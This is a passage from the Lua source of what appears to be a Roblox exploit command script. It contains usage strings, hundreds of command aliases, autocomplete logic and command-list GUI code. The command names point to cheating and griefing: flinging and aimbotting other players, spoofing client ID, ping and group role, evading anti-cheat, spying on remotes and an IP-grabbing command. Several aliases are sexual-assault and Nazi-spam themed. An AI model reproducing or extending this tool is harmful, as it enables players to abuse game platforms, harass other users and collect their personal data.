				["testaudio"] = "(id)",
				["directjoin"] = "(placeid / this) (guid)",
				["tabs"] = "(on / off)",
				["changetab"] = "(1 - 9) (cmd)",
				["debugging"] = "(on / off)",
				["runafter"] = "(on / off)",
				["removeinchar"] = "(part)",
				["teleportstring"] = "(cb / copy)",
				["friend"] = "(plr / all)",
				["autorejoin"] = "(on / off)",
				["onjoin"] = "(cmd) (\"plr\" / args)",
				["onleave"] = "(cmd) (\"plr\" / args)",
				["freegotobp"] = "(num) (num) (num)",
				["gotobppart"] = "(part)",
				["freegoto"] = "(num) (num) (num)",
				["gotobpclass"] = "(class)",
				["anticheat"] = "(var)",
				["unfriend"] = "(plr / all)",
				["freecamgoto"] = "(plr)",
				["freecamfreegoto"] = "(num) (num) (num)",
				["freecamgotopart"] = "(part)",
				["audiotp"] = "(num)",
				["loadbpppos"] = "(name)",
				["play"] = "(id)",
				["vfreegoto"] = "(num) (num) (num)",
				["vgotopart"] = "(name)",
				["vgotoclass"] = "(name)",
				["vloadpos"] = "(name)",
				["freecamloadpos"] = "(name)",
				["backpackplay"] = "(plr)",
				["unbackpackplay"] = "(plr)",
				["migratesaves"] = "(file)",
				["loopfling"] = "(plr)",
				["appearanceidpublic"] = "(plr)",
				["appearanceidprivate"] = "(plr)",
				["nilgoto"] = "(plr)",
				["nilfreegoto"] = "(num) (num) (num)",
				["nilgotopart"] = "(part)",
				["nilgotoclass"] = "(class)",
				["removeinworkspace"] = "(part)",
				["destroyheight"] = "(num)",
				["spectatepart"] = "(part)",
				["multispam"] = "(str) (comma as a separator) (str)",
				["logspam"] = "(str)",
				["logchat"] = "(str)",
				["hd"] = "(str)",
				["colourbubbles"] = "(bgx | bgy | bgz) (tx | ty | tz)",
				["kohls"] = "(str)",
				["transparentbubbles"] = "(num)",
				["robloxfromdiscordid"] = "(discid)",
				["noshow"] = "(on/off)",
				["reverse"] = "(num)",
				["maxslopeangle"] = "(num)",
				["permmaxslopeangle"] = "(num)",
				["badgesnipe"] = "(user)",
				["viewserver"] = "(placeid/this) (guid)",
				["servers"] = "(placeid/this)",
				["chatprivacy"] = "(AllUsers/NoOne/Friends)",
				["chatprivacypublic"] = "(plr)",
				["chatprivacyprivate"] = "(plr)",
				["cameraoffset"] = "(num1 | num2 | num3)",
				["removecmd"] = "(cmd)",
				["spoofgrouprole"] = "(role)",
				["chaos"] = "(num)",
				["parttracers"] = "(name / class) (item)",
				["lookat"] = "(plr)",
				["spoofclientid"] = "(str)",
				["xboxtagpublic"] = "(plr)",
				["xboxtagprivate"] = "(plr)",
				["followedintopublic"] = "(plr)",
				["followedintoprivate"] = "(plr)",
				["replicateanim"] = "(id) (speed)",
				["replicateanimspeed"] = "(speed)",
				["spooffps"] = "(num)",
				["spoofping"] = "(num)",
				["spoofmemory"] = "(num)",
				["alias"] = "(new_name) (cmd)",
				["clicktplimit"] = "(num)"
			}
			CMDS.aliases = {
				["8ballpu"] = "eightballpu",
				["8ballpr"] = "eightballpr",
				["fjoin"] = "friendjoin",
				["cmds"] = "commands",
				["help"] = "commands",
				["settings"] = "config",
				["adv"] = "advertise",
				["unadv"] = "unadvertise",
				["ver"] = "version",
				["v"] = "version",
				["ws"] = "walkspeed",
				["dws"] = "defaultwalkspeed",
				["jp"] = "jumppower",
				["djp"] = "defaultjumppower",
				["hh"] = "hipheight",
				["dhh"] = "defaulthipheight",
				["grav"] = "gravity",
				["dgrav"] = "defaultgravity",
				["bpws"] = "bodypositionwalkspeed",
				["decapitate"] = "halve",
				["rhands"] = "removehands",
				["rfeet"] = "removefeet",
				["rlleg"] = "removeleftleg",
				["rrleg"] = "removerightleg",
				["rlarm"] = "removeleftarm",
				["rrarm"] = "removerightarm",
				["rarms"] = "removearms",
				["rlegs"] = "removelegs",
				["rlimbs"] = "removelimbs",
				["ranim"] = "removeanim",
				["reanim"] = "restoreanim",
				--["rshirt"] = "removeshirt",
				--["rtshirt"] = "removetshirt",
				--["rpants"] = "removepants",
				--["naked"] = "removeclothes",
				--["rclothes"] = "removeclothes",
				["rhatsmesh"] = "removehatsmesh",
				["rhm"] = "removehatsmesh",
				["rgearmesh"] = "removegearmesh",
				["rgm"] = "removegearmesh",
				["rtoolmesh"] = "removegearmesh",
				["rtm"] = "removegearmesh",
				["removetoolmesh"] = "removegearmesh",
				["droptools"] = "dropgears",
				["rface"] = "removeface",
				["rhats"] = "removehats",
				["rhdm"] = "rheadmesh",
				["equipall"] = "equip",
				["duoflip"] = "doubleflip",
				["unduoflip"] = "undoubleflip",
				["stick"] = "glue",
				["unstick"] = "unglue",
				["juicewrld"] = "seizure",
				["unjuicewrld"] = "unseizure",
				["invisfling"] = "invisiblefling",
				["ifling"] = "invisiblefling",
				["ffling"] = "freefling",
				["cfling"] = "cleanfling",
				["stutter"] = "lag",
				["unstutter"] = "unlag",
				["weak"] = "weaken",
				["strong"] = "strengthen",
				["		"] = "noresult",
				["  "] = "noresult",
				["unstrong"] = "unweak",
				["buna"] = "bringunanchored",
				["luna"] = "listunanchored",
				["anim"] = "animation",
				["unanim"] = "unanimation",
				["unspas"] = "uninsane",
				["mashdance"] = "monstermash",
				["stun"] = "ragdoll",
				["unstun"] = "unragdoll",
				["beybladeletitrip"] = "spin",
				["facerape"] = "facefuck",
				["unfacerape"] = "unfacefuck",
				["facerapeanim"] = "facefuckanim",
				["unfacerapeanim"] = "unfacefuckanim",
				["ride"] = "piggyback",
				["unride"] = "unpiggyback",
				["rape"] = "fuck",
				["unrape"] = "unfuck",
				["stalk"] = "follow",
				["unstalk"] = "unfollow",
				["oldrblx"] = "oldroblox",
				["sg"] = "savegame",
				["bt"] = "btools",
				["f3x"] = "fex",
				["sspy"] = "remotespy",
				["reffects"] = "removeeffects",
				["rseats"] = "removeseats",
				["rls"] = "removelocalscripts",
				["x"] = "xray",
				["unx"] = "unxray",
				["lws"] = "lockws",
				["uws"] = "unlockws",
				["time14"] = "day",
				["time0"] = "night",
				["rsky"] = "removesky",
				["relighting"] = "restorelighting",
				["recamera"] = "restorecamera",
				["riw"] = "removeinviswalls",
				["placeinfo"] = "gameinfo",
				["calc"] = "math",
				["calculate"] = "math",
				["killgui"] = "fuckoff",
				["message"] = "messagebox",
				["msg"] = "messagebox",
				["fe"] = "filtering",
				["placeid"] = "gameid",
				["esl"] = "enableshiftlock",
				["camunlock"] = "maxcamunlock",
				["pos"] = "position",
				["audioid"] = "audiolog",
				["spiderman"] = "grapple",
				["unspiderman"] = "ungrapple",
				["afk"] = "antiafk",
				["bhop"] = "bunnyhop",
				["unbhop"] = "unbunnyhop",
				["invis"] = "invisible",
				["seat"] = "sit",
				["seatwalk"] = "sitwalk",
				["anchored"] = "freeze",
				["unfreeze"] = "thaw",
				["unanchored"] = "thaw",
				["to"] = "goto",
				["tp"] = "goto",
				["moveto"] = "walkto",
				["unmoveto"] = "unwalkto",
				["movetopos"] = "walktopos",
				["movetopart"] = "walktopart",
				["movetoclass"] = "walktoclass",
				["re"] = "refresh",
				["r"] = "reset",
				["spos"] = "savepos",
				["lpos"] = "loadpos",
				["pf"] = "platform",
				["unpf"] = "unplatform",
				["ctrltp"] = "clicktp",
				["ij"] = "infjump",
				["unij"] = "uninfjump",
				["vfly"] = "vehiclefly",
				["fs"] = "flyspeed",
				["rj"] = "rejoin",
				["place"] = "game",
				["breach"] = "boxreach",
				["nc"] = "noclip",
				["brightness"] = "light",
				["unbrightness"] = "unlight",
				["ab"] = "aimbot",
				["unab"] = "unaimbot",
				["wlf"] = "whitelistfriends",
				["unwlf"] = "unwhitelistfriends",
				["wl"] = "whitelist",
				["unwl"] = "unwhitelist",
				["swl"] = "showwhitelist",
				["view"] = "spectate",
				["unview"] = "unspectate",
				["rsaves"] = "resetsaves",
				["ssaves"] = "savesaves",
				["agepr"] = "ageprivate",
				["agepu"] = "agepublic",
				["idpr"] = "idprivate",
				["idpu"] = "idpublic",
				["vrpr"] = "vrprivate",
				["vrpu"] = "vrpublic",
				["profile"] = "profileinfo",
				["closeprofile"] = "closeprofileinfo",
				["asciinazi"] = "nazispam",
				["unasciinazi"] = "unnazispam",
				["s"] = "spam",
				["uns"] = "unspam",
				["ss"] = "spamspeed",
				["dicepu"] = "dicepublic",
				["dicepr"] = "diceprivate",
				["numberpu"] = "numberpublic",
				["numberpr"] = "numberprivate",
				["pluginload"] = "plugin",
				["p_"] = "plugin",
				["clickdel"] = "clickdelete",
				["unclickdel"] = "unclickdelete",
				["rforces"] = "removeforces",
				["lowgraphics"] = "antilag",
				["clr"] = "clear",
				["rterrain"] = "removeterrain",
				["outputl"] = "outputlarger",
				["dpos"] = "deletepos",
				["cpos"] = "clearpos",
				["swim"] = "swimwalk",
				["iqsize"] = "iq",
				["freach"] = "freereach",
				["toolhat"] = "gearhat",
				["bp"] = "bypass",
				["unbp"] = "unbypass",
				["e"] = "emote",
				["cf"] = "chatframe",
				["fbc"] = "forcebubblechat",
				["unfbc"] = "unforcebubblechat",
				["iesp"] = "itemesp",
				["uniesp"] = "unitemesp",
				["sd"] = "saydiscord",
				["rcbp"] = "removecustombodyparts",
				["rcustombp"] = "removecustombodyparts",
				["spas"] = "insane",
				["ad"] = "admindetect",
				["hidenames"] = "streamermode",
				["pfs"] = "permflyspeed",
				["loopto"] = "loopgoto",
				["looptp"] = "loopgoto",
				["unloopto"] = "unloopgoto",
				["unlooptp"] = "unloopgoto",
				["dupetools"] = "dupegears",
				["pws"] = "permwalkspeed",
				["pjp"] = "permjumppower",
				["phh"] = "permhipheight",
				["pgrav"] = "permgravity",
				["tobp"] = "gotobp",
				["tpbp"] = "gotobp",
				["vto"] = "vgoto",
				["vtp"] = "vgoto",
				["cs"] = "changestyle",
				["ch"] = "chat",
				["tcfly"] = "toggleconfly",
				["tc"] = "trollchat",
				["unbpws"] = "unbodypositionwalkspeed",
				["rgears"] = "removegears",
				["removetools"] = "removegears",
				["rtools"] = "removegears",
				["unctrltp"] = "unclicktp",
				["unswim"] = "unswimwalk",
				["pstalker"] = "playerstalker",
				["c"] = "clip",
				["unnoclip"] = "clip",
				["orb"] = "orbit",
				["corb"] = "closeorbit",
				["unorb"] = "unorbit",
				["uncloseorbit"] = "unorbit",
				["uncorb"] = "unorbit",
				["cbring"] = "clientbring",
				["uncbring"] = "unclientbring",
				["script"] = "using",
				["iuse"] = "using",
				["jdpr"] = "joindateprivate",
				["jdpu"] = "joindatepublic",
				["pp"] = "ppsize",
				["gay"] = "gaysize",
				["match"] = "matchmake",
				["gtools"] = "grabtools",
				["ungtools"] = "ungrabtools",
				["rfe"] = "respectfiltering",
				["rfog"] = "removefog",
				["cfreeze"] = "clientfreeze",
				["uncfreeze"] = "unclientfreeze",
				["redead"] = "refreshdead",
				["unredead"] = "unrefreshdead",
				["ip"] = "grabip",
				["massjd"] = "massjoindate",
				["savegears"] = "savetools",
				["sgears"] = "savetools",
				["stools"] = "savetools",
				["loadgears"] = "loadtools",
				["lgears"] = "loadtools",
				["ltools"] = "loadtools",
				["async"] = "animsync",
				["unasync"] = "unanimsync",
				["pss"] = "permspamspeed",
				["wlogs"] = "whisperlogs",
				["plogs"] = "playerlogs",
				["rjdiff"] = "rejoindiff",
				["rjd"] = "rejoindiff",
				["ssnipe"] = "streamsnipe",
				["gtime"] = "gametime",
				["ts"] = "truesight",
				["unts"] = "untruesight",
				["topart"] = "gotopart",
				["cbpart"] = "clientbringpart",
				["cdpart"] = "clientdeletepart",
				["bbsize"] = "boobsize",
				["tospawn"] = "gotospawn",
				["sens"] = "mousesensitivity",
				["vol"] = "volume",
				["fc"] = "freecam",
				["unfc"] = "unfreecam",
				["viewpack"] = "backpack",
				["pesp"] = "partesp",
				["unpesp"] = "unpartesp",
				["emotespeed"] = "animspeed",
				["rappublic"] = "rappu",
				["rapprivate"] = "rappr",
				["runa"] = "removeunanchored",
				["reet"] = "retard",
				["unreet"] = "unretard",
				["nocmds"] = "nocommands",
				["yescmds"] = "yescommands",
				["bpplay"] = "backpackplay",
				["unbpplay"] = "unbackpackplay",
				["420"] = "weed",
				["gts"] = "guitruesight",
				["ungts"] = "unguitruesight",
				["fcs"] = "freecamspeed",
				["pfcs"] = "permfreecamspeed",
				["nobgs"] = "nobillboardguis",
				["yesbgs"] = "yesbillboardguis",
				["grip"] = "grippos",
				["shiftws"] = "shiftwalkspeed",
				["unshiftws"] = "unshiftwalkspeed",
				["animsteal"] = "animationsteal",
				["animrob"] = "animationsteal",
				["asteal"] = "animationsteal",
				["unanimsteal"] = "unanimationsteal",
				["unanimrob"] = "unanimationsteal",
				["unasteal"] = "unanimationsteal",
				["nohurtol"] = "nohurtoverlay",
				["yeshurtol"] = "yeshurtoverlay",
				["tofreecam"] = "gotofreecam",
				["gotofc"] = "gotofreecam",
				["tofc"] = "gotofreecam",
				["relocalscripts"] = "restorelocalscripts",
				["rels"] = "restorelocalscripts",
				["rcnt"] = "removecustomnametag",
				["dof"] = "depth",
				["undof"] = "undepth",
				["cmode"] = "cinematic",
				["uncmode"] = "uncinematic",
				["atm"] = "atmosphere",
				["unatm"] = "unatmosphere",
				["fact"] = "funfact",
				["afling"] = "antifling",
				["noclipothers"] = "antifling",
				["?"] = "cmdinfo",
				["simrad"] = "simulationradius",
				["guna"] = "grabunanchored",
				["cuna"] = "clearunanchored",
				["suna"] = "spinunanchored",
				["unsuna"] = "unspinunanchored",
				["rcmd"] = "randomcmd",
				["reintro"] = "replayintro",
				["firetouches"] = "touchinterests",
				["firetouch"] = "singletouchinterest",
				["fireclicks"] = "clickdetectors",
				["fireclick"] = "singleclickdetector",
				["toclass"] = "gotoclass",
				["paudios"] = "playingaudios",
				["taudio"] = "testaudio",
				["stopdupetools"] = "stopdupegears",
				["dirjoin"] = "directjoin",
				["synctime"] = "irltime",
				["ctab"] = "changetab",
				["debugmode"] = "debugging",
				["rinchar"] = "removeinchar",
				["sbuna"] = "setbackunanchored",
				["cmutel"] = "cutmuteloop",
				["smute"] = "supermute",
				["unsmute"] = "unsupermute",
				["rqtver"] = "robloxqtversion",
				["tpstring"] = "teleportstring",
				["copyoutputl"] = "copyoutputlarger",
				["fr"] = "friend",
				["autorj"] = "autorejoin",
				["freetpbp"] = "freegotobp",
				["freetobp"] = "freegotobp",
				["tpbppart"] = "gotobppart",
				["tobppart"] = "gotobppart",
				["tpbpspawn"] = "gotobpspawn",
				["tobpspawn"] = "gotobpspawn",
				["freetp"] = "freegoto",
				["freeto"] = "freegoto",
				["bbmd"] = "billboardmaxdistance",
				["unbbmd"] = "unbillboardmaxdistance",
				["bbts"] = "billboardtruesight",
				["unbbts"] = "unbillboardtruesight",
				["sgts"] = "surfaceguitruesight",
				["unsgts"] = "unsurfaceguitruesight",
				["cdms"] = "clickdetectormaxdistance",
				["uncdms"] = "unclickdetectormaxdistance",
				["tobpclass"] = "gotobpclass",
				["tpbpclass"] = "gotobpclass",
				["ac"] = "anticheat",
				["acs"] = "anticheats",
				["unfr"] = "unfriend",
				["cutbploop"] = "cutbackpackplayloop",
				["fcgoto"] = "freecamgoto",
				["fcto"] = "freecamgoto",
				["fctp"] = "freecamgoto",
				["vnc"] = "vnoclip",
				["vc"] = "vclip",
				["fcfreegoto"] = "freecamfreegoto",
				["fcfreeto"] = "freecamfreegoto",
				["fcfreetp"] = "freecamfreegoto",
				["fcgotopart"] = "freecamgotopart",
				["fctopart"] = "freecamgotopart",
				["fctppart"] = "freecamgotopart",
				["atp"] = "audiotp",
				["mem"] = "memory",
				["uncfling"] = "uncleanfling",
				["aplay"] = "play",
				["attts"] = "attachmenttruesight",
				["unattts"] = "unattachmenttruesight",
				["autopf"] = "autoplatform",
				["unautopf"] = "unautoplatform",
				["`"] = "quickexit",
				["quit"] = "quickexit",
				["vfreeto"] = "vfreegoto",
				["vfreetp"] = "vfreegoto",
				["vtopart"] = "vgotopart",
				["vtppart"] = "vgotopart",
				["vtoclass"] = "vgotoclass",
				["vtpclass"] = "vgotoclass",
				["rver"] = "robloxversion",
				["fcloadpos"] = "freecamloadpos",
				["rjre"] = "rejoinrefresh",
				["bpp"] = "backpackplay",
				["unbpp"] = "unbackpackplay",
				["msaves"] = "migratesaves",
				["rguipos"] = "resetguipos",
				["lfling"] = "loopfling",
				["unlfling"] = "unloopfling",
				["flighting"] = "futurelighting",
				["unflighting"] = "unfuturelighting",
				["rlefthand"] = "removelefthand",
				["rlhand"] = "removelefthand",
				["rrighthand"] = "removerighthand",
				["rrhand"] = "removerighthand",
				["rleftfoot"] = "removeleftfoot",
				["rlfoot"] = "removeleftfoot",
				["rrightfoot"] = "removerightfoot",
				["rrfoot"] = "removerightfoot",
				["rrightlowerarm"] = "removerightlowerarm",
				["rrlarm"] = "removerightlowerarm",
				["rleftlowerarm"] = "removeleftlowerarm",
				["rllarm"] = "removeleftlowerarm",
				["rrightlowerleg"] = "removerightlowerleg",
				["rrlleg"] = "removerightlowerleg",
				["rleftlowerleg"] = "removeleftlowerleg",
				["rllleg"] = "removeleftlowerleg",
				["aidpu"] = "appearanceidpublic",
				["aidpr"] = "appearanceidprivate",
				["niltp"] = "nilgoto",
				["nilto"] = "nilgoto",
				["nilfreetp"] = "nilfreegoto",
				["nilfreeto"] = "nilfreegoto",
				["niltopart"] = "nilgotopart",
				["niltppart"] = "nilgotopart",
				["niltoclass"] = "nilgotoclass",
				["niltpclass"] = "nilgotoclass",
				["rinworkspace"] = "removeinworkspace",
				["rinnil"] = "removeinnil",
				["dheight"] = "destroyheight",
				["nesp"] = "nameesp",
				["unnesp"] = "unnameesp",
				["viewpart"] = "spectatepart",
				["rje"] = "rejoinexecute",
				["ms"] = "multispam",
				["ls"] = "logspam",
				["unls"] = "unlogspam",
				["lch"] = "logchat",
				["rroot"] = "removeroot",
				["rjree"] = "rejoinrefreshexecute",
				["noragdoll"] = "nofall",
				["antifall"] = "nofall",
				["antiragdoll"] = "nofall",
				["yesragdoll"] = "yesfall",
				["unantifall"] = "yesfall",
				["unantiragdoll"] = "yesfall",
				["noragdollbp"] = "nofallbp",
				["antifallbp"] = "nofallbp",
				["antiragdollbp"] = "nofallbp",
				["yesragdollbp"] = "yesfallbp",
				["unantifallbp"] = "yesfallbp",
				["unantiragdollbp"] = "yesfallbp",
				["fixbc"] = "fixbubblechat",
				["bcfix"] = "fixbubblechat",
				["unfixbc"] = "unfixbubblechat",
				["bcunfix"] = "unfixbubblechat",
				["dbubbles"] = "darkbubbles",
				["lbubbles"] = "undarkbubbles",
				["c_"] = "combo",
				["c_s"] = "combos",
				["c_new"] = "combonew",
				["c_del"] = "combodel",
				["c_clr"] = "combosclr",
				["c_sclear"] = "combosclr",
				["ks"] = "kohls",
				["cidpu"] = "creatoridpublic",
				["cidpr"] = "creatoridprivate",
				["cid"] = "creatorid",
				["transbubbles"] = "transparentbubbles",
				["untransbubbles"] = "untransparentbubbles",
				["dsl"] = "disableshiftlock",
				["rfromdiscid"] = "robloxfromdiscordid",
				["nilccmds"] = "nilchatcmds",
				["unnilccmds"] = "unnilchatcmds",
				["stats"] = "statistics",
				["susers"] = "scriptusers",
				["maxsl"] = "maxslopeangle",
				["permmaxsl"] = "permmaxslopeangle",
				["dmaxsl"] = "defaultmaxslopeangle",
				["bsnipe"] = "badgesnipe",
				["cprivpu"] = "chatprivacypublic",
				["cprivpr"] = "chatprivacyprivate",
				["cpriv"] = "chatprivacy",
				["masscpriv"] = "masschatprivacy",
				["camoffset"] = "cameraoffset",
				["norot"] = "norotate",
				["yesrot"] = "yesrotate",
				["autorun"] = "runafter",
				["nomsgs"] = "nomessages",
				["yesmsgs"] = "yesmessages",
				["rcmd"] = "removecmd",
				["spoofgr"] = "spoofgrouprole",
				["unspoofgr"] = "unspoofgrouprole",
				["nogametp"] = "nogameteleport",
				["nogtp"] = "nogameteleport",
				["yesgametp"] = "yesgameteleport",
				["yesgtp"] = "yesgameteleport",
				["ptracers"] = "parttracers",
				["unptracers"] = "unparttracers",
				["spoofclid"] = "spoofclientid",
				["rspoofclid"] = "randomspoofclientid",
				["unspoofclid"] = "unspoofclientid",
				["clnh"] = "cleanhats",
				["xbtagpu"] = "xboxtagpublic",
				["xbtagpr"] = "xboxtagprivate",
				["massxbtag"] = "massxboxtag",
				["followedintopu"] = "followedintopublic",
				["followedintopr"] = "followedintoprivate",
				["repanim"] = "replicateanim",
				["repanimspeed"] = "replicateanimspeed",
				["speed"] = "walkspeed",
				["clearchar"] = "clearcharacter",
				["antiwafk"] = "antiwindowafk",
				["wafk"] = "antiwindowafk",
				["unantiwafk"] = "unantiwindowafk",
				["unwafk"] = "unantiwindowafk",
				["cord"] = "discord",
				["serverhop"] = "rejoindiff",
				["ctrltplimit"] = "clicktplimit",
				["ctp"] = "clicktp",
				["unctp"] = "unclicktp",
				["ctplimit"] = "clicktplimit",
				["unctplimit"] = "unclicktplimit",
				["ctrltplimit"] = "clicktplimit",
				["unctrltplimit"] = "unclicktplimit",
				["headsit"] = "piggyback",
			}

			local function suggestions_update()
				CMDS.suggestions = {}
				aliases = aliases or {}

				for alias, command in pairs(aliases) do
					CMDS.aliases[alias] = command
				end

				for alias in pairs(CMDS.aliases) do
					for alias_idx = 1, string.len(alias) do
						CMDS.suggestions[alias:sub(1, alias_idx)] = alias
					end
				end

				for command in pairs(CMDS.commands) do
					for command_idx = 1, string.len(command) do
						CMDS.suggestions[command:sub(1, command_idx)] = command
					end
				end

				for command in pairs(CMDS.commands) do
					CMDS.suggestions[command] = command
				end

				for alias, command in pairs(CMDS.aliases) do
					CMDS.suggestions[alias] = alias
				end

				for alias in pairs(CMDS.suggestions) do
					if CMDS.aliases[alias] then
						CMDS.suggestions[alias] = CMDS.aliases[alias]
					end
					if CMDS.commands[alias] then
						CMDS.suggestions[alias] = alias
					end
				end
			end
			task.spawn(suggestions_update)



			rejoining = false
			function ifKicked()
				cmdp.PlayerRemoving:Connect(function(p)
					if rejoining == false and p == cmdlp then
						game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, cmdp)
					end
				end)
			end

			if ifKickedAuto then
				ifKicked()
			end

			cmd.Changed:Connect(function()
				if CMDS.aliases[cmd.Text] then
					cmdsu.Text = cmd.Text
				elseif CMDS.aliases[CMDS.suggestions[cmd.Text]] then
					cmdsu.Text = CMDS.suggestions[cmd.Text]
				elseif CMDS.suggestions[cmd.Text] then
					cmdsu.Text = CMDS.suggestions[cmd.Text]
				else
					cmdsu.Text = ""
				end
			end)

			cmd.FocusLost:Connect(function()
				cmdsu.Text = ""
			end)

			cmduis.InputBegan:Connect(function()
				if cmduis:IsKeyDown(Enum.KeyCode.RightShift) and cmd:IsFocused() and cmdsu.Text ~= "" then
					cmd.Text = cmdsu.Text
					cmd.CursorPosition = #cmd.Text+1
				elseif cmduis:IsKeyDown(Enum.KeyCode.Tab) and cmd:IsFocused() and cmdsu.Text ~= "" then
					local a = cmdsu.Text
					game:GetService("RunService").RenderStepped:Wait()
					cmd.Text = a.." "
					cmd.CursorPosition = #cmd.Text+1
				end
			end)

			local cmdsholder = Instance.new("Frame", getParent)
			local Cmdsearch = Instance.new("TextBox", getParent)
			local xoutofcmds = Instance.new("TextButton", getParent)
			local scrollholder = Instance.new("Frame", getParent)
			local Scrollingcmdi = Instance.new("ScrollingFrame", getParent)
			local Hovercmdi = Instance.new("Frame", getParent)
			local Hovertexti = Instance.new("TextLabel", getParent)

			cmdsholder.Name = "cmdsholder"
			cmdsholder.Parent = Unnamed
			cmdsholder.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
			cmdsholder.BorderSizePixel = 0
			cmdsholder.Position = UDim2.new(0.217357904, 0, 0.208845213, 0)
			cmdsholder.Size = UDim2.new(0, 424, 0, 294)
			createDrag(cmdsholder)
			cmdsholder.Active = true
			cmdsholder.Visible = false

			Cmdsearch.Name = "Cmdsearch"
			Cmdsearch.Parent = cmdsholder
			Cmdsearch.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
			Cmdsearch.BorderSizePixel = 0
			Cmdsearch.Position = UDim2.new(0.245283023, 0, 0.884353757, 0)
			Cmdsearch.Size = UDim2.new(0, 213, 0, 26)
			Cmdsearch.Font = Enum.Font.SourceSans
			Cmdsearch.PlaceholderText = "Search commands..."
			Cmdsearch.Text = ""
			Cmdsearch.TextColor3 = Color3.fromRGB(255, 255, 255)
			Cmdsearch.TextSize = 14

			xoutofcmds.Name = "xoutofcmds"
			xoutofcmds.Parent = cmdsholder
			xoutofcmds.BackgroundColor3 = Color3.new(1, 1, 1)
			xoutofcmds.BackgroundTransparency = 1
			xoutofcmds.Position = UDim2.new(0.948113203, 0, 0, 0)
			xoutofcmds.Size = UDim2.new(0, 22, 0, 22)
			xoutofcmds.Font = Enum.Font.GothamBold
			xoutofcmds.Text = "X"
			xoutofcmds.TextColor3 = Color3.new(1, 1, 1)
			xoutofcmds.TextSize = 20
			xoutofcmds.MouseButton1Down:Connect(function()
				Scrollingcmdi:ClearAllChildren()
				cmdsholder.Visible = false
			end)

			scrollholder.Name = "scrollholder"
			scrollholder.Parent = cmdsholder
			scrollholder.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
			scrollholder.BorderSizePixel = 0
			scrollholder.Position = UDim2.new(0.0306603778, 0, 0.0748299286, 0)
			scrollholder.Size = UDim2.new(0, 397, 0, 232)

			Scrollingcmdi.Name = "Scrollingcmdi"
			Scrollingcmdi.Parent = scrollholder
			Scrollingcmdi.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
			Scrollingcmdi.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
			Scrollingcmdi.BorderSizePixel = 0
			Scrollingcmdi.Position = UDim2.new(0.00986763742, 0, 0.102678575, 0)
			Scrollingcmdi.Size = UDim2.new(0, 389, 0, 204)
			Scrollingcmdi.ScrollBarThickness = 5

			Hovercmdi.Name = "Hovercmdi"
			Hovercmdi.Parent = scrollholder
			Hovercmdi.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
			Hovercmdi.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
			Hovercmdi.BorderSizePixel = 1
			Hovercmdi.ZIndex = 88
			Hovercmdi.Visible = false
			Hovercmdi.Size = UDim2.new(1.06325, 0, 0.1715, 0)
			Hovercmdi.Position = UDim2.new(-0.0321, 0, 1, Hovercmdi.AbsoluteSize.Y)

			Hovertexti.Name = "Hovertexti"
			Hovertexti.Parent = Hovercmdi
			Hovertexti.TextColor3 = Color3.new(255,255,255)
			Hovertexti.BackgroundTransparency = 1
			Hovertexti.BorderSizePixel = 0
			Hovertexti.Font = "SourceSansBold"
			Hovertexti.TextSize = 14
			Hovertexti.ZIndex = 89
			Hovertexti.Position = UDim2.new(.5,0,.5,0)

			function updatehovertext(text)
				Hovertexti.Text = text
			end

			function CreateCMDLabel(num,name,aliases,func,usage)
				local sf2 = Scrollingcmdi
				if #sf2:GetChildren() >= 2546 then
					sf2:ClearAllChildren()
				end
				local alls2 = 0
				for _,v in pairs(sf2:GetChildren()) do
					if v then
						alls2 = v.Size.Y.Offset + alls2
					end
					if not v then
						alls2 = 0
					end
				end
				local tl2 = Instance.new('TextButton', sf2)
				tl2.Name = name
				tl2.ZIndex = 6
				tl2.Text = num..string.rep(" ", 7 - (#tostring(num)-1)*3).."| "..name.." ("..aliases..")"
				tl2.Size = UDim2.new(0,322,0,50)
				tl2.BackgroundTransparency = 1
				tl2.BorderSizePixel = 0
				tl2.Font = "SourceSansBold"
				tl2.Position = UDim2.new(-1,0,0,alls2)
				tl2.TextTransparency = 1
				tl2.TextScaled = false
				tl2.TextSize = 14
				tl2.TextWrapped = true
				tl2.TextXAlignment = "Left"
				tl2.TextYAlignment = "Top"
				tl2.TextColor3 = Color3.fromRGB(255,255,255)
				tl2.Size = UDim2.new(0,322,0,tl2.TextBounds.Y)
				tl2.Position = UDim2.new(0,3,0,alls2)
				tl2.MouseButton1Down:Connect(function()
					cmd.Text = name.." "
				end)
				sf2.CanvasSize = UDim2.new(0,0,0,alls2+tl2.TextBounds.Y)
				sf2.CanvasPosition = Vector2.new(0,sf2.CanvasPosition.Y+tl2.TextBounds.Y)
				local size22 = sf2.CanvasSize.Y.Offset
				tl2.TextTransparency = 0
				local menter = tl2.MouseEnter:Connect(function()
					game:GetService("RunService").RenderStepped:Wait()
					Hovercmdi.Visible = true
					local pass = func.."\n"..usage
					updatehovertext(pass)
				end)
				local mleave = tl2.MouseLeave:Connect(function()
					Hovercmdi.Visible = false
				end)
			end

			Cmdsearch.FocusLost:Connect(function()
				Scrollingcmdi:ClearAllChildren()
				if Cmdsearch.Text ~= "" then
					local cmdloop1 = 0
					local cmdloop2 = 0
					for i,v in pairs(CMDS.commands) do
						local aliases = ""
						cmdloop2 = cmdloop2 + 1
						for o,b in pairs(CMDS.aliases) do
							if i == b then
								cmdloop1 = cmdloop1 + 1
								aliases = aliases..o..", "
								if cmdloop1%200 == 0 then
									game:GetService("RunService").RenderStepped:Wait()
								end
							end
						end
						aliases = aliases:sub(1,#aliases-2)
						local usage = "()"
						if CMDS.usage[i] then
							usage = CMDS.usage[i]
						end
						if aliases:find(Cmdsearch.Text) or i:find(Cmdsearch.Text) then
							CreateCMDLabel(cmdloop2,i,aliases,v,usage)
						end
					end
				else
					local cmdloop1 = 0
					local cmdloop2 = 0
					for i,v in pairs(CMDS.commands) do
						local aliases = ""
						cmdloop2 = cmdloop2 + 1
						for o,b in pairs(CMDS.aliases) do
							if i == b then
								cmdloop1 = cmdloop1 + 1
								aliases = aliases..o..", "
								if cmdloop1%200 == 0 then
									game:GetService("RunService").RenderStepped:Wait()
								end
							end
						end
						aliases = aliases:sub(1,#aliases-2)
						local usage = ""
						if CMDS.usage[i] then
							usage = CMDS.usage[i]
						end
